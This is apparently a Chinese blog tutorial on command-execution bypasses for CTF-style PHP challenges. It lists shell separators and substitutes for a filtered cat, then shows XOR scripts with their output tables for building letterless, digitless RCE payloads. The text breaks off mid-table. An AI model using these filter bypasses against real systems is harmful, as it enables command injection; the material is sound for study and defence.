<h2 id="命令执行相关内容"><a href="#命令执行相关内容" class="headerlink" title="命令执行相关内容"></a>命令执行相关内容</h2><h3 id="拼接符"><a href="#拼接符" class="headerlink" title="拼接符"></a>拼接符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; ：前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;： 表示前一条命令执行成功时，才执行后一条命令</span><br><span class="line">| ：直接执行后面的语句</span><br><span class="line">|| ：表示上一条命令执行失败后，才执行下一条命令</span><br><span class="line">; ：表示命令依次执行</span><br></pre></td></tr></table></figure>

<h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式 .*就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串,以第一个a开始，最后一个b结束。如果用它来搜索aabab的话，它会匹配整个字符串aabab。</span><br></pre></td></tr></table></figure>

<h3 id="ls-cat"><a href="#ls-cat" class="headerlink" title="ls  cat"></a>ls  cat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</span><br><span class="line"></span><br><span class="line">cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上。</span><br><span class="line"></span><br><span class="line">如果cat被过滤，可以用下边的方法进行绕过</span><br><span class="line"></span><br><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br></pre></td></tr></table></figure>

<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将指定的函数体插入并取代每一处调用该函数的地方。反引号 在linux中作为内联执行，执行输出结果。</span><br></pre></td></tr></table></figure>



<h2 id="无数字和字母RCE、"><a href="#无数字和字母RCE、" class="headerlink" title="无数字和字母RCE、"></a>无数字和字母RCE、</h2><h3 id="1-异或绕过"><a href="#1-异或绕过" class="headerlink" title="1.异或绕过"></a>1.异或绕过</h3><p><img src="/2023/03/15/RCE/image-20221215225144269.png" alt="image-20221215225144269"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$code</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]+/&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用没有被过滤的符号异或生成对应的字母</p>
<p>异或结果没有是数字的</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;-~@#$%^&amp;*_+|/?.,&lt;&gt;`&#123;&#125;[]()&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&gt;<span class="number">64</span> &amp;&amp; (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&lt;<span class="number">91</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;i ^ j = &#x27;</span>,<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j)),<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">        <span class="keyword">elif</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&gt;<span class="number">96</span> &amp;&amp; (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&lt;<span class="number">123</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;i ^ j = &#x27;</span>,<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j)),<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;-~@#$%^&amp;*_+|/?.,&lt;&gt;`&#123;&#125;[]()&#x27;</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">            <span class="comment"># print(ord(i) ^ ord(j))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">int</span>(r):</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&#x27;^&#x27;</span>, j, <span class="string">&#x27;=&#x27;</span>, <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j)), <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j))</span><br><span class="line">                </span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">            <span class="comment"># print(ord(i) ^ ord(j))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">int</span>(r):</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&#x27;^&#x27;</span>, j, <span class="string">&#x27;=&#x27;</span>, <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j)), <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j))</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">~ ^ ? = A <span class="number">65</span> </span><br><span class="line">? ^ ~ = A <span class="number">65</span></span><br><span class="line">&lt; ^ &#125; = A <span class="number">65</span></span><br><span class="line">&#125; ^ &lt; = A <span class="number">65</span></span><br><span class="line">~ ^ &lt; = B <span class="number">66</span></span><br><span class="line">| ^ &gt; = B <span class="number">66</span></span><br><span class="line">? ^ &#125; = B <span class="number">66</span></span><br><span class="line">&lt; ^ ~ = B <span class="number">66</span></span><br><span class="line">&gt; ^ | = B <span class="number">66</span></span><br><span class="line">&#125; ^ ? = B <span class="number">66</span></span><br><span class="line"><span class="comment"># ^ ` = C 67</span></span><br><span class="line">| ^ ? = C <span class="number">67</span></span><br><span class="line">? ^ | = C <span class="number">67</span></span><br><span class="line">&gt; ^ &#125; = C <span class="number">67</span></span><br><span class="line">` ^ <span class="comment"># = C 67</span></span><br><span class="line">&#125; ^ &gt; = C <span class="number">67</span></span><br><span class="line">$ ^ ` = D <span class="number">68</span></span><br><span class="line">? ^ &#123; = D <span class="number">68</span></span><br><span class="line">` ^ $ = D <span class="number">68</span></span><br><span class="line">&#123; ^ ? = D <span class="number">68</span></span><br><span class="line">% ^ ` = E <span class="number">69</span></span><br><span class="line">&gt; ^ &#123; = E <span class="number">69</span></span><br><span class="line">` ^ % = E <span class="number">69</span></span><br><span class="line">&#123; ^ &gt; = E <span class="number">69</span></span><br><span class="line">&amp; ^ ` = F <span class="number">70</span></span><br><span class="line">` ^ &amp; = F <span class="number">70</span></span><br><span class="line">&lt; ^ &#123; = G <span class="number">71</span></span><br><span class="line">&#123; ^ &lt; = G <span class="number">71</span></span><br><span class="line">` ^ ( = H <span class="number">72</span></span><br><span class="line">( ^ ` = H <span class="number">72</span></span><br><span class="line">` ^ ) = I <span class="number">73</span></span><br><span class="line">) ^ ` = I <span class="number">73</span></span><br><span class="line">* ^ ` = J <span class="number">74</span></span><br><span class="line">` ^ * = J <span class="number">74</span></span><br><span class="line">+ ^ ` = K <span class="number">75</span></span><br><span class="line">` ^ + = K <span class="number">75</span></span><br><span class="line">, ^ ` = L <span class="number">76</span></span><br><span class="line">` ^ , = L <span class="number">76</span></span><br><span class="line">- ^ ` = M <span class="number">77</span></span><br><span class="line">` ^ - = M <span class="number">77</span></span><br><span class="line">. ^ ` = N <span class="number">78</span></span><br><span class="line">` ^ . = N <span class="number">78</span></span><br><span class="line">/ ^ ` = O <span class="number">79</span></span><br><span class="line">` ^ / = O <span class="number">79</span></span><br><span class="line">- ^ &#125; = P <span class="number">80</span></span><br><span class="line">~ ^ . = P <span class="number">80</span></span><br><span class="line">+ ^ &#123; = P <span class="number">80</span></span><br><span class="line">| ^ , = P <span class="number">80</span></span><br><span class="line">. ^ ~ = P <span class="number">80</span></span><br><span class="line">, ^ | = P <span class="number">80</span></span><br><span class="line">&#123; ^ + = P <span class="number">80</span></span><br><span class="line">&#125; ^ - = P <span class="number">80</span></span><br><span class="line">- ^ | = Q <span class="number">81</span></span><br><span class="line">~ ^ / = Q <span class="number">81</span></span><br><span class="line">* ^ &#123; = Q <span class="number">81</span></span><br><span class="line">| ^ - = Q <span class="number">81</span></span><br><span class="line">/ ^ ~ = Q <span class="number">81</span></span><br><span class="line">, ^ &#125; = Q <span class="number">81</span></span><br><span class="line">&#123; ^ * = Q <span class="number">81</span></span><br><span class="line">&#125; ^ , = Q <span class="number">81</span></span><br><span class="line">~ ^ , = R <span class="number">82</span></span><br><span class="line">| ^ . = R <span class="number">82</span></span><br><span class="line">/ ^ &#125; = R <span class="number">82</span></span><br><span class="line">. ^ | = R <span class="number">82</span></span><br><span class="line">, ^ ~ = R <span class="number">82</span></span><br><span class="line">&#123; ^ ) = R <span class="number">82</span></span><br><span class="line">&#125; ^ / = R <span class="number">82</span></span><br><span class="line">) ^ &#123; = R <span class="number">82</span></span><br><span class="line">- ^ ~ = S <span class="number">83</span></span><br><span class="line">~ ^ - = S <span class="number">83</span></span><br><span class="line">| ^ / = S <span class="number">83</span></span><br><span class="line">/ ^ | = S <span class="number">83</span></span><br><span class="line">. ^ &#125; = S <span class="number">83</span></span><br><span class="line">&#123; ^ ( = S <span class="number">83</span></span><br><span class="line">&#125; ^ . = S <span class="number">83</span></span><br><span class="line">( ^ &#123; = S <span class="number">83</span></span><br><span class="line">~ ^ * = T <span class="number">84</span></span><br><span class="line">* ^ ~ = T <span class="number">84</span></span><br><span class="line">| ^ ( = T <span class="number">84</span></span><br><span class="line">/ ^ &#123; = T <span class="number">84</span></span><br><span class="line">&#123; ^ / = T <span class="number">84</span></span><br><span class="line">&#125; ^ ) = T <span class="number">84</span></span><br><span class="line">( ^ | = T <span class="number">84</span></span><br><span class="line">) ^ &#125; = T <span class="number">84</span></span><br><span class="line">~ ^ + = U <span class="number">85</span></span><br><span class="line">+ ^ ~ = U <span class="number">85</span></span><br><span class="line">| ^ ) = U <span class="number">85</span></span><br><span class="line">. ^ &#123; = U <span class="number">85</span></span><br><span class="line">&#123; ^ . = U <span class="number">85</span></span><br><span class="line">&#125; ^ ( = U <span class="number">85</span></span><br><span class="line">( ^ &#125; = U <span class="number">85</span></span><br><span class="line">) ^ | = U <span class="number">85</span></span><br><span class="line">- ^ &#123; = V <span class="number">86</span></span><br><span class="line">~ ^ ( = V <span class="number">86</span></span><br><span class="line">* ^ | = V <span class="number">86</span></span><br><span class="line">+ ^ &#125; = V <span class="number">86</span></span><br><span class="line">| ^ * = V <span class="number">86</span></span><br><span class="line">&#123; ^ - = V <span class="number">86</span></span><br><span class="line">&#125; ^ + = V <span class="number">86</span></span><br><span class="line">( ^ ~ = V <span class="number">86</span></span><br><span class="line">~ ^ ) = W <span class="number">87</span></span><br><span class="line">* ^ &#125; = W <span class="number">87</span></span><br><span class="line">+ ^ | = W <span class="number">87</span></span><br><span class="line">| ^ + = W <span class="number">87</span></span><br><span class="line">, ^ &#123; = W <span class="number">87</span></span><br><span class="line">&#123; ^ , = W <span class="number">87</span></span><br><span class="line">&#125; ^ * = W <span class="number">87</span></span><br><span class="line">) ^ ~ = W <span class="number">87</span></span><br><span class="line">~ ^ &amp; = X <span class="number">88</span></span><br><span class="line"><span class="comment"># ^ &#123; = X 88</span></span><br><span class="line">$ ^ | = X <span class="number">88</span></span><br><span class="line">% ^ &#125; = X <span class="number">88</span></span><br><span class="line">&amp; ^ ~ = X <span class="number">88</span></span><br><span class="line">| ^ $ = X <span class="number">88</span></span><br><span class="line">&#123; ^ <span class="comment"># = X 88</span></span><br><span class="line">&#125; ^ % = X <span class="number">88</span></span><br><span class="line">$ ^ &#125; = Y <span class="number">89</span></span><br><span class="line">% ^ | = Y <span class="number">89</span></span><br><span class="line">| ^ % = Y <span class="number">89</span></span><br><span class="line">&#125; ^ $ = Y <span class="number">89</span></span><br><span class="line">~ ^ $ = Z <span class="number">90</span></span><br><span class="line">$ ^ ~ = Z <span class="number">90</span></span><br><span class="line">&amp; ^ | = Z <span class="number">90</span></span><br><span class="line">| ^ &amp; = Z <span class="number">90</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">^ ^ ? = a <span class="number">97</span></span><br><span class="line">_ ^ &gt; = a <span class="number">97</span></span><br><span class="line">? ^ ^ = a <span class="number">97</span></span><br><span class="line">&lt; ^ ] = a <span class="number">97</span></span><br><span class="line">&gt; ^ _ = a <span class="number">97</span></span><br><span class="line">] ^ &lt; = a <span class="number">97</span></span><br><span class="line">^ ^ &lt; = b <span class="number">98</span></span><br><span class="line">? ^ ] = b <span class="number">98</span></span><br><span class="line">&lt; ^ ^ = b <span class="number">98</span></span><br><span class="line">] ^ ? = b <span class="number">98</span></span><br><span class="line"><span class="meta">@ ^ </span><span class="comment"># = c 99</span></span><br><span class="line"><span class="comment"># ^ @ = c 99</span></span><br><span class="line">_ ^ &lt; = c <span class="number">99</span></span><br><span class="line">&lt; ^ _ = c <span class="number">99</span></span><br><span class="line">&gt; ^ ] = c <span class="number">99</span></span><br><span class="line">] ^ &gt; = c <span class="number">99</span></span><br><span class="line"><span class="meta">@ ^ $ = d <span class="number">100</span></span></span><br><span class="line">$ ^ @ = d <span class="number">100</span></span><br><span class="line">? ^ [ = d <span class="number">100</span></span><br><span class="line">[ ^ ? = d <span class="number">100</span></span><br><span class="line"><span class="meta">@ ^ % = e <span class="number">101</span></span></span><br><span class="line">% ^ @ = e <span class="number">101</span></span><br><span class="line">&gt; ^ [ = e <span class="number">101</span></span><br><span class="line">[ ^ &gt; = e <span class="number">101</span></span><br><span class="line"><span class="meta">@ ^ &amp; = f <span class="number">102</span></span></span><br><span class="line">&amp; ^ @ = f <span class="number">102</span></span><br><span class="line">&lt; ^ [ = g <span class="number">103</span></span><br><span class="line">[ ^ &lt; = g <span class="number">103</span></span><br><span class="line"><span class="meta">@ ^ (<span class="params"> = h <span class="number">104</span></span></span></span><br><span class="line"><span class="params"><span class="meta">(<span class="params"> ^ @ = h <span class="number">104</span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="meta">@ ^ </span>) = i <span class="number">105</span></span></span></span><br><span class="line"><span class="params"><span class="meta"></span>) ^ @ = i <span class="number">105</span></span></span><br><span class="line"><span class="meta">@ ^ * = j <span class="number">106</span></span></span><br><span class="line">* ^ @ = j <span class="number">106</span></span><br><span class="line"><span class="meta">@ ^ + = k <span class="number">107</span></span></span><br><span class="line">+ ^ @ = k <span class="number">107</span></span><br><span class="line"><span class="meta">@ ^ , = l <span class="number">108</span></span></span><br><span class="line">, ^ @ = l <span class="number">108</span></span><br><span class="line">- ^ @ = m <span class="number">109</span></span><br><span class="line"><span class="meta">@ ^ - = m <span class="number">109</span></span></span><br><span class="line"><span class="meta">@ ^ . = n <span class="number">110</span></span></span><br><span class="line">. ^ @ = n <span class="number">110</span></span><br><span class="line"><span class="meta">@ ^ / = o <span class="number">111</span></span></span><br><span class="line">/ ^ @ = o <span class="number">111</span></span><br><span class="line">- ^ ] = p <span class="number">112</span></span><br><span class="line">^ ^ . = p <span class="number">112</span></span><br><span class="line">_ ^ / = p <span class="number">112</span></span><br><span class="line">+ ^ [ = p <span class="number">112</span></span><br><span class="line">/ ^ _ = p <span class="number">112</span></span><br><span class="line">. ^ ^ = p <span class="number">112</span></span><br><span class="line">[ ^ + = p <span class="number">112</span></span><br><span class="line">] ^ - = p <span class="number">112</span></span><br><span class="line">^ ^ / = q <span class="number">113</span></span><br><span class="line">* ^ [ = q <span class="number">113</span></span><br><span class="line">_ ^ . = q <span class="number">113</span></span><br><span class="line">/ ^ ^ = q <span class="number">113</span></span><br><span class="line">. ^ _ = q <span class="number">113</span></span><br><span class="line">, ^ ] = q <span class="number">113</span></span><br><span class="line">[ ^ * = q <span class="number">113</span></span><br><span class="line">] ^ , = q <span class="number">113</span></span><br><span class="line">- ^ _ = r <span class="number">114</span></span><br><span class="line">^ ^ , = r <span class="number">114</span></span><br><span class="line">_ ^ - = r <span class="number">114</span></span><br><span class="line">/ ^ ] = r <span class="number">114</span></span><br><span class="line">, ^ ^ = r <span class="number">114</span></span><br><span class="line">[ ^ ) = r <span class="number">114</span></span><br><span class="line">] ^ / = r <span class="number">114</span></span><br><span class="line">) ^ [ = r <span class="number">114</span></span><br><span class="line">- ^ ^ = s <span class="number">115</span></span><br><span class="line">^ ^ - = s <span class="number">115</span></span><br><span class="line">_ ^ , = s <span class="number">115</span></span><br><span class="line">. ^ ] = s <span class="number">115</span></span><br><span class="line">, ^ _ = s <span class="number">115</span></span><br><span class="line">[ ^ ( = s <span class="number">115</span></span><br><span class="line">] ^ . = s <span class="number">115</span></span><br><span class="line">( ^ [ = s <span class="number">115</span></span><br><span class="line">^ ^ * = t <span class="number">116</span></span><br><span class="line">* ^ ^ = t <span class="number">116</span></span><br><span class="line">_ ^ + = t <span class="number">116</span></span><br><span class="line">+ ^ _ = t <span class="number">116</span></span><br><span class="line">/ ^ [ = t <span class="number">116</span></span><br><span class="line">[ ^ / = t <span class="number">116</span></span><br><span class="line">] ^ ) = t <span class="number">116</span></span><br><span class="line">) ^ ] = t <span class="number">116</span></span><br><span class="line">^ ^ + = u <span class="number">117</span></span><br><span class="line">* ^ _ = u <span class="number">117</span></span><br><span class="line">_ ^ * = u <span class="number">117</span></span><br><span class="line">+ ^ ^ = u <span class="number">117</span></span><br><span class="line">. ^ [ = u <span class="number">117</span></span><br><span class="line">[ ^ . = u <span class="number">117</span></span><br><span class="line">] ^ ( = u <span class="number">117</span></span><br><span class="line">( ^ ] = u <span class="number">117</span></span><br><span class="line">- ^ [ = v <span class="number">118</span></span><br><span class="line">^ ^ ( = v <span class="number">118</span></span><br><span class="line">_ ^ ) = v <span class="number">118</span></span><br><span class="line">+ ^ ] = v <span class="number">118</span></span><br><span class="line">[ ^ - = v <span class="number">118</span></span><br><span class="line">] ^ + = v <span class="number">118</span></span><br><span class="line">( ^ ^ = v <span class="number">118</span></span><br><span class="line">) ^ _ = v <span class="number">118</span></span><br><span class="line">^ ^ ) = w <span class="number">119</span></span><br><span class="line">* ^ ] = w <span class="number">119</span></span><br><span class="line">_ ^ ( = w <span class="number">119</span></span><br><span class="line">, ^ [ = w <span class="number">119</span></span><br><span class="line">[ ^ , = w <span class="number">119</span></span><br><span class="line">] ^ * = w <span class="number">119</span></span><br><span class="line">( ^ _ = w <span class="number">119</span></span><br><span class="line">) ^ ^ = w <span class="number">119</span></span><br><span class="line"><span class="comment"># ^ [ = x 120</span></span><br><span class="line">% ^ ] = x <span class="number">120</span></span><br><span class="line">^ ^ &amp; = x <span class="number">120</span></span><br><span class="line">&amp; ^ ^ = x <span class="number">120</span></span><br><span class="line">[ ^ <span class="comment"># = x 120</span></span><br><span class="line">] ^ % = x <span class="number">120</span></span><br><span class="line">$ ^ ] = y <span class="number">121</span></span><br><span class="line">&amp; ^ _ = y <span class="number">121</span></span><br><span class="line">_ ^ &amp; = y <span class="number">121</span></span><br><span class="line">] ^ $ = y <span class="number">121</span></span><br><span class="line">$ ^ ^ = z <span class="number">122</span></span><br><span class="line">% ^ _ = z <span class="number">122</span></span><br><span class="line">^ ^ $ = z <span class="number">122</span></span><br><span class="line">_ ^ % = z <span class="number">122</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 